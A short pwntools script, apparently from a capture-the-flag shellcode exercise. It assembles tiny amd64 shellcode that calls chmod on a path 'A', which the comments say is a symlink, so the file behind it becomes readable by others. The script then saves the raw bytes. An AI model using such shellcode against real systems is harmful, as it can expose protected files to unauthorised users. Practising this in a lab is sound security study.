#创建一个软连接
#chmod 修改的是源文件

from pwn import *
context.arch = "amd64"
context.terminal = ['multixterm', '-e']  # Attempting to use multixterm

my_sc = asm('''
            push 0x41
            mov rdi, rsp
            mov sil, 0x4
            mov al, 0x5a
            syscall
'''
)
# display the bytes
print(disasm(my_sc))
print("len: %d",len(my_sc))
fd = open("ttt-raw","wb+")
fd.write(my_sc)
fd.close()